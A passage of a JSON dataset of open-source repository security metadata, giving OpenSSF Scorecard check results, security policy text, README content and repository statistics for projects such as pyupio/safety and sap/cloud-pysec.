        "num_watchers": 11948,
        "num_forks": 642,
        "num_subscribers": 138,
        "SecurityPolicy_created_at": "2022-01-09 12:04:29",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "2aaf60e572c0a65b517fbe2452e7f07cd46eb89a",
                "url": "https://github.com/Nuitka/Nuitka/commit/2aaf60e572c0a65b517fbe2452e7f07cd46eb89a",
                "date": "2024-01-22 20:41:57"
            },
            {
                "commit_id": "23895b212a84c24807cf7ee2b4642424c7060bb8",
                "url": "https://github.com/Nuitka/Nuitka/commit/23895b212a84c24807cf7ee2b4642424c7060bb8",
                "date": "2022-06-17 10:07:08"
            },
            {
                "commit_id": "9dd483b6763cf2a3a0f913c6e5be61817ba301ee",
                "url": "https://github.com/Nuitka/Nuitka/commit/9dd483b6763cf2a3a0f913c6e5be61817ba301ee",
                "date": "2022-04-25 09:58:33"
            },
            {
                "commit_id": "4cdd8cddfacdfca5a5d16074a3b737c6e6ab5ed0",
                "url": "https://github.com/Nuitka/Nuitka/commit/4cdd8cddfacdfca5a5d16074a3b737c6e6ab5ed0",
                "date": "2022-01-09 12:04:29"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "email",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "Scope of practice",
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    },
    {
        "project_name": "pyupio/safety",
        "project_url": "https://github.com/pyupio/safety",
        "SSF": {
            "date": "2024-10-30T01:23:39+07:00",
            "repo": {
                "name": "github.com/pyupio/safety",
                "commit": "9ee0b67fb50765a1b7e4988e1f3cc3647107bab0"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 5.8,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'main'",
                        "Info: 'allow deletion' disabled on branch 'develop'",
                        "Info: 'force pushes' disabled on branch 'main'",
                        "Info: 'force pushes' disabled on branch 'develop'",
                        "Warn: required approving review count is 1 on branch 'main'",
                        "Warn: branch 'develop' does not require approvers",
                        "Warn: codeowners review is not required on branch 'main'",
                        "Warn: codeowners review is not required on branch 'develop'",
                        "Warn: no status checks found to merge onto branch 'main'",
                        "Warn: no status checks found to merge onto branch 'develop'",
                        "Info: PRs are required in order to make changes on branch 'main'"
                    ],
                    "score": 5,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "20 out of 20 merged PRs checked by a CI test -- score normalized to 10",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "all changesets reviewed",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: pyupio contributor org/company found, sorbayhq contributor org/company found, senorg contributor org/company found, syncsketch contributor org/company found, tigerbeetle contributor org/company found, practo @olacabs @learnsteps @letusdevops contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 6 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Warn: no dependency update tool configurations found"
                    ],
                    "score": 0,
                    "reason": "no update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: MIT License: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "30 commit(s) and 19 issue activity found in the last 90 days -- score normalized to 10",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Info: Project packages its releases by way of GitHub Actions.: .github/workflows/build.yml:7"
                    ],
                    "score": 10,
                    "reason": "packaging workflow detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build.yml:11: update your workflow using https://app.stepsecurity.io/secureworkflow/pyupio/safety/build.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build.yml:13: update your workflow using https://app.stepsecurity.io/secureworkflow/pyupio/safety/build.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/build.yml:30: update your workflow using https://app.stepsecurity.io/secureworkflow/pyupio/safety/build.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/build.yml:40: update your workflow using https://app.stepsecurity.io/secureworkflow/pyupio/safety/build.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/build.yml:57: update your workflow using https://app.stepsecurity.io/secureworkflow/pyupio/safety/build.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/issue_responder.yml:14: update your workflow using https://app.stepsecurity.io/secureworkflow/pyupio/safety/issue_responder.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:12: update your workflow using https://app.stepsecurity.io/secureworkflow/pyupio/safety/main.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:14: update your workflow using https://app.stepsecurity.io/secureworkflow/pyupio/safety/main.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/main.yml:35: update your workflow using https://app.stepsecurity.io/secureworkflow/pyupio/safety/main.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:49: update your workflow using https://app.stepsecurity.io/secureworkflow/pyupio/safety/main.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:51: update your workflow using https://app.stepsecurity.io/secureworkflow/pyupio/safety/main.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:60: update your workflow using https://app.stepsecurity.io/secureworkflow/pyupio/safety/main.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:66: update your workflow using https://app.stepsecurity.io/secureworkflow/pyupio/safety/main.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:72: update your workflow using https://app.stepsecurity.io/secureworkflow/pyupio/safety/main.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:78: update your workflow using https://app.stepsecurity.io/secureworkflow/pyupio/safety/main.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:93: update your workflow using https://app.stepsecurity.io/secureworkflow/pyupio/safety/main.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:95: update your workflow using https://app.stepsecurity.io/secureworkflow/pyupio/safety/main.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:117: update your workflow using https://app.stepsecurity.io/secureworkflow/pyupio/safety/main.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/main.yml:118: update your workflow using https://app.stepsecurity.io/secureworkflow/pyupio/safety/main.yml/main?enable=pin",
                        "Warn: containerImage not pinned by hash: .devcontainer/Dockerfile:2: pin your Docker image by updating python:3.12-slim to python:3.12-slim@sha256:032c52613401895aa3d418a4c563d2d05f993bc3ecc065c8f4e2280978acd249",
                        "Warn: containerImage not pinned by hash: Dockerfile:1: pin your Docker image by updating python:3.12-slim to python:3.12-slim@sha256:032c52613401895aa3d418a4c563d2d05f993bc3ecc065c8f4e2280978acd249",
                        "Warn: containerImage not pinned by hash: tests/action/docker-insecure/Dockerfile:1: pin your Docker image by updating python:3.10-slim to python:3.10-slim@sha256:eb9ca77b1a0ffbde84c1dc333beb3490a2638813cc25a339f8575668855b9ff1",
                        "Warn: containerImage not pinned by hash: tests/action/docker-secure/Dockerfile:1: pin your Docker image by updating python:3.10-slim to python:3.10-slim@sha256:eb9ca77b1a0ffbde84c1dc333beb3490a2638813cc25a339f8575668855b9ff1",
                        "Warn: pipCommand not pinned by hash: Dockerfile:11",
                        "Warn: pipCommand not pinned by hash: tests/action/docker-insecure/Dockerfile:3",
                        "Warn: pipCommand not pinned by hash: tests/action/docker-secure/Dockerfile:3",
                        "Warn: pipCommand not pinned by hash: release.sh:56",
                        "Warn: pipCommand not pinned by hash: .github/workflows/build.yml:20",
                        "Warn: pipCommand not pinned by hash: .github/workflows/main.yml:21",
                        "Warn: pipCommand not pinned by hash: .github/workflows/main.yml:22",
                        "Warn: pipCommand not pinned by hash: .github/workflows/main.yml:100",
                        "Warn: pipCommand not pinned by hash: .github/workflows/main.yml:101",
                        "Info:   0 out of  14 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   1 out of   6 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   4 containerImage dependencies pinned",
                        "Info:   0 out of   9 pipCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 0 commits out of 30 are checked with a SAST tool"
                    ],
                    "score": 0,
                    "reason": "SAST tool is not run on all commits -- score normalized to 0",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: SECURITY.md:1",
                        "Info: Found linked content: SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: SECURITY.md:1",
                        "Info: Found text in security policy: SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": [
                        "Warn: release artifact 3.2.10 not signed: https://api.github.com/repos/pyupio/safety/releases/182025277",
                        "Warn: release artifact 3.2.9 not signed: https://api.github.com/repos/pyupio/safety/releases/181828310",
                        "Warn: release artifact 3.2.8 not signed: https://api.github.com/repos/pyupio/safety/releases/180297184",
                        "Warn: release artifact 3.2.3 not signed: https://api.github.com/repos/pyupio/safety/releases/159658697",
                        "Warn: release artifact 3.2.0 not signed: https://api.github.com/repos/pyupio/safety/releases/153670202",
                        "Warn: release artifact 3.2.10 does not have provenance: https://api.github.com/repos/pyupio/safety/releases/182025277",
                        "Warn: release artifact 3.2.9 does not have provenance: https://api.github.com/repos/pyupio/safety/releases/181828310",
                        "Warn: release artifact 3.2.8 does not have provenance: https://api.github.com/repos/pyupio/safety/releases/180297184",
                        "Warn: release artifact 3.2.3 does not have provenance: https://api.github.com/repos/pyupio/safety/releases/159658697",
                        "Warn: release artifact 3.2.0 does not have provenance: https://api.github.com/repos/pyupio/safety/releases/153670202"
                    ],
                    "score": 0,
                    "reason": "Project has not signed or included provenance with any releases.",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Warn: jobLevel 'contents' permission set to 'write': .github/workflows/main.yml:115",
                        "Warn: no topLevel permission defined: .github/workflows/build.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/issue_responder.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/main.yml:1"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/pyupio/safety/contents/SECURITY.md",
        "SecurityPolicy_content": "# Security Policy\n\n## Supported Versions\n\nWe release patches and updates to ensure the security of our software. Below is a list of supported versions:\n\n| Version | Supported          |\n| ------- | ------------------ |\n| 3.x.x   | ✅  |\n| < 3.0   | ❌                 |\n\n## Reporting a Vulnerability\n\nIf you discover a security vulnerability in this repository, please report it to us directly. We take security issues seriously and will respond promptly to address the issue.\n\nTo report a vulnerability:\n\n1. **Email**: Please send the details to [engineers@safetycli.com](mailto:engineers@safetycli.com). Include as much information as possible to help us understand the nature of the vulnerability and how it can be reproduced.\n\n2. **Bug Bounty Program**: We offer a bug bounty program for qualifying vulnerabilities. Detailed information about the program, including eligibility and rewards, can be found on our [Bug Bounty Program page](https://safetycli.com/resources/bug-bounty).\n\n## Security Best Practices\n\nWe encourage our users to follow these best practices to ensure the security of their deployments:\n\n- Always run the latest version of the software to benefit from security updates.\n- Regularly review and update dependencies to avoid known vulnerabilities.\n- Consider using containerization and sandboxing techniques to isolate the software from other parts of your system.\n\n## Code of Conduct\n\nPlease note that all participants in our community are expected to adhere to our [Code of Conduct](./CODE_OF_CONDUCT.md). This includes those participating in our security bounty program.\n\nThank you for helping to keep our project secure!\n",
        "project_all_labels": [
            "bug",
            "considering",
            "Critical",
            "documentation",
            "duplicate",
            "enhancement",
            "good first issue",
            "help wanted",
            "High",
            "invalid",
            "Low",
            "Medium",
            "question",
            "wontfix"
        ],
        "README_content": "[![safety](https://cdn.safetycli.com/images/cli_readme_header.png)](https://docs.safetycli.com/)\n\n[![Downloads](https://static.pepy.tech/badge/safety/month)](https://pepy.tech/project/safety)\n![Build Status](https://github.com/pyupio/safety/actions/workflows/main.yml/badge.svg)\n![License](https://img.shields.io/github/license/pyupio/safety)\n![PyPI Version](https://img.shields.io/pypi/v/safety)\n![Python Versions](https://img.shields.io/pypi/pyversions/safety)\n![Coverage](https://img.shields.io/codecov/c/github/pyupio/safety)\n\n> [!NOTE]\n> [Come and join us at SafetyCLI](https://apply.workable.com/safety/). We are hiring for various roles.\n\n# Table of Contents\n- [Table of Contents](#table-of-contents)\n- [Introduction](#introduction)\n- [Key Features](#key-features)\n- [Getting Started](#getting-started)\n  - [GitHub Action](#github-action)\n  - [Command Line Interface](#command-line-interface)\n    - [1. Installation](#1-installation)\n    - [2. Log In or Register](#2-log-in-or-register)\n    - [3. Running Your First Scan](#3-running-your-first-scan)\n  - [Basic Commands](#basic-commands)\n- [Service-Level Agreement (SLA)](#service-level-agreement-sla)\n- [Detailed Documentation](#detailed-documentation)\n- [License](#license)\n- [Supported Python Versions](#supported-python-versions)\n- [Resources](#resources)\n\n# Introduction\nSafety CLI is a Python dependency vulnerability scanner designed to enhance software supply chain security by detecting packages with known vulnerabilities and malicious packages in local development environments, CI/CD, and production systems.\nSafety CLI can be deployed in minutes and provides clear, actionable recommendations for remediation of detected vulnerabilities.\n\nLeveraging the industry's most comprehensive database of vulnerabilities and malicious packages, Safety CLI Scanner allows teams to detect vulnerabilities at every stage of the software development lifecycle.\n\n# Key Features\n- Versatile, comprehensive dependency security scanning for Python packages.\n- Leverages Safety DB, the most comprehensive vulnerability data available for Python.\n- Clear output with detailed recommendations for vulnerability remediation.\n- Automatically updates requirements files to secure versions of dependencies where available, guided by your project's policy settings.\n- Scanning of individual requirements files and project directories or system-wide scans on developer machines, CI/CD pipelines, and Production systems to detect vulnerable or malicious dependencies.\n- JSON, SBOM, HTML and text output.\n- Easy integration with CI/CD pipelines, including GitHub Actions.\n- Enterprise Ready: Safety CLI can be deployed to large teams with complex project setups with ease, on-premise or as a SaaS product.\n\n# Getting Started\n## GitHub Action\n\n- Test Safety CLI in CI/CD using our [GitHub Action](https://github.com/pyupio/safety-action).\n- Full documentation on the [GitHub Action](https://github.com/pyupio/safety-action) is available on our [Documentation Hub](https://docs.safetycli.com).\n\n## Command Line Interface\n\n### 1. Installation\n\n- Install Safety on your development machine.\n- Run `pip install safety`.\n\n### 2. Log In or Register\n\n- Run your first scan using `safety scan`.\n- If not authenticated, Safety will prompt for account creation or login.\n- Use `safety auth` to check authentication status.\n\n### 3. Running Your First Scan\n\n- Navigate to a project directory and run `safety scan`.\n- Safety will perform a scan and present results in the Terminal.\n\n## Basic Commands\n\n- `safety --help`: Access help and display all available commands.\n- `safety auth`: Start authentication flow or display status.\n- `safety scan`: Perform a vulnerability scan in the current directory.\n- `safety system-scan`: Perform a scan across the entire development machine.\n- `safety scan --apply-fixes`: Update vulnerable dependencies.\n\n# Service-Level Agreement (SLA)\n\nWe are committed to maintaining a high level of responsiveness and transparency in managing issues reported in our codebases. This SLA outlines our policies and procedures for handling issues to ensure timely resolutions and effective communication with our community.\n\n- [Read our full SLA](./SLA.md)\n\n# Detailed Documentation\nFull documentation is available at [https://docs.safetycli.com](https://docs.safetycli.com).\n\nIncluded in the documentation are the following key topics:\n\n**Safety CLI 3**\n- [Introduction to Safety CLI 3](https://docs.safetycli.com/safety-docs/safety-cli-3/introduction-to-safety-cli-scanner)\n- [Quick Start Guide](https://docs.safetycli.com/safety-docs/safety-cli-3/quick-start-guide)\n- [Installation and Authentication](https://docs.safetycli.com/safety-docs/safety-cli-3/installation-and-authentication)\n- [Scanning for Vulnerable and Malicious Packages](https://docs.safetycli.com/safety-docs/safety-cli-3/scanning-for-vulnerable-and-malicious-packages)\n- [System-Wide Developer Machine Scanning](https://docs.safetycli.com/safety-docs/safety-cli-3/system-wide-developer-machine-scanning)\n- [Viewing Scan Results](https://docs.safetycli.com/safety-docs/safety-cli-3/viewing-scan-results)\n- [Available Commands and Inputs](https://docs.safetycli.com/safety-docs/safety-cli-3/available-commands-and-inputs)\n- [Scanning in CI/CD](https://docs.safetycli.com/safety-docs/safety-cli-3/scanning-in-ci-cd)\n- [License Scanning](https://docs.safetycli.com/safety-docs/safety-cli-3/license-scanning)\n- [Exit Codes](https://docs.safetycli.com/safety-docs/safety-cli-3/exit-codes)\n\n**Vulnerability Remediation**\n- [Applying Fixes](https://docs.safetycli.com/safety-docs/vulnerability-remediation/applying-fixes)\n\n**Integration**\n- [Securing Git Repositories](https://docs.safetycli.com/safety-docs/installation/securing-git-repositories)\n- [GitHub](https://docs.safetycli.com/safety-docs/installation/github)\n- [GitHub Actions](https://docs.safetycli.com/safety-docs/installation/github-actions)\n- [GitLab](https://docs.safetycli.com/safety-docs/installation/gitlab)\n- [Git Post-Commit Hooks](https://docs.safetycli.com/safety-docs/installation/git-post-commit-hooks)\n- [BitBucket](https://docs.safetycli.com/safety-docs/installation/bitbucket)\n- [Pipenv](https://docs.safetycli.com/safety-docs/installation/pipenv)\n- [Docker Containers](https://docs.safetycli.com/safety-docs/installation/docker-containers)\n\n**Administration**\n- [Policy Management](https://docs.safetycli.com/safety-docs/administration/policy-management)\n\n**Output**\n- [Output Options and Recommendations](https://docs.safetycli.com/safety-docs/output/output-options-and-recommendations)\n- [JSON Output](https://docs.safetycli.com/safety-docs/output/json-output)\n- [SBOM Output](https://docs.safetycli.com/safety-docs/output/sbom-output)\n- [HTML Output](https://docs.safetycli.com/safety-docs/output/html-output)\n\n**Miscellaneous**\n- [Release Notes](https://docs.safetycli.com/safety-docs/miscellaneous/release-notes)\n- [Breaking Changes in Safety 3](https://docs.safetycli.com/safety-docs/miscellaneous/release-notes/breaking-changes-in-safety-3)\n- [Safety 2.x Documentation](https://docs.safetycli.com/safety-2)\n- [Support](https://docs.safetycli.com/safety-docs/miscellaneous/support)\n\nSystem status is available at [https://status.safetycli.com](https://status.safetycli.com)\n\nFurther support is available by emailing support@safetycli.com.\n\n# License\nSafety is released under the MIT License.\n\nUpon creating an account, a 7-day free trial of our Team plan is offered to new users, after which they will be downgraded to our Free plan. This plan is limited to a single user and is not recommended for commercial purposes.\n\nOur paid [plans for commercial use](https://safetycli.com/resources/plans) begin at just $25 per seat per month and allow scans to be performed using our full vulnerability database, complete with 3x more tracked vulnerabilities and malicious packages than our free plan and other providers. To learn more about our Team and Enterprise plans, please visit [https://safetycli.com/resources/plans](https://safetycli.com/resources/plans) or email sales@safetycli.com.\n\n# Supported Python Versions\nSafety CLI 3 supports Python versions >=3.7. Further details on supported versions, as well as options to run Safety CLI on versions <3.7 using a Docker image are available in our [Documentation Hub](https://docs.safetycli.com).\n\nWe maintain a policy of supporting all maintained and secure versions of Python, plus one minor version below the oldest maintained and secure version. Details on Python versions that meet these criteria can be found here: https://endoflife.date/python.\n\n# Resources\n\n- [Safety Cybersecurity website](https://safetycli.com)\n- [Safety Login Page](https://safetycli.com/login)\n- [Documentation](https://docs.safetycli.com)\n- [Careers/Hiring](https://apply.workable.com/safety/)\n- [Security Research and Blog](https://safetycli.com/blog)\n- [GitHub Action](https://github.com/safetycli/action)\n- [Support](mailto:support@safetycli.com)\n- [Status Page](https://status.safetycli.com)\n",
        "num_commits": 676,
        "project_age_days": 2932,
        "project_created_at": "2016-10-19",
        "latest_updated_at": "2024-10-30",
        "latest_pushed_at": "2024-10-25",
        "num_contributors": 39,
        "num_pull": 395,
        "num_issues": 614,
        "num_opening_issue": 87,
        "project_size(kB)": 2580,
        "num_stargazers": 1720,
        "num_watchers": 1720,
        "num_forks": 147,
        "num_subscribers": 34,
        "SecurityPolicy_created_at": "2024-08-28 19:46:55",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "3b243fe2526843056f7bdf5d309bd4f392581699",
                "url": "https://github.com/pyupio/safety/commit/3b243fe2526843056f7bdf5d309bd4f392581699",
                "date": "2024-08-28 19:46:55"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "email_external",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "Scope of practice",
            "Reporting mechanism",
            "User guideline",
            "User guideline"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    },
    {
        "project_name": "sap/cloud-pysec",
        "project_url": "https://github.com/sap/cloud-pysec",
        "SSF": {
            "date": "2024-10-29T21:38:46+07:00",
            "repo": {
                "name": "github.com/sap/cloud-pysec",
                "commit": "0c554829c8fecd6dec77c1c3af2bbf316eba8c60"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 5.1,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'main'",
                        "Info: 'force pushes' disabled on branch 'main'",
                        "Warn: required approving review count is 1 on branch 'main'",
                        "Warn: codeowners review is not required on branch 'main'",
                        "Info: status check found to merge onto on branch 'main'",
                        "Info: PRs are required in order to make changes on branch 'main'"
                    ],
                    "score": 8,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 4,
                    "reason": "4 out of 10 merged PRs checked by a CI test -- score normalized to 4",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 6,
                    "reason": "Found 9/13 approved changesets -- score normalized to 6",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: sap-contributions contributor org/company found, sap se contributor org/company found, SAP contributor org/company found, sap contributor org/company found, cloudfoundry contributor org/company found, sap-cloudfoundry contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 6 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Warn: no dependency update tool configurations found"
                    ],
                    "score": 0,
                    "reason": "no update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
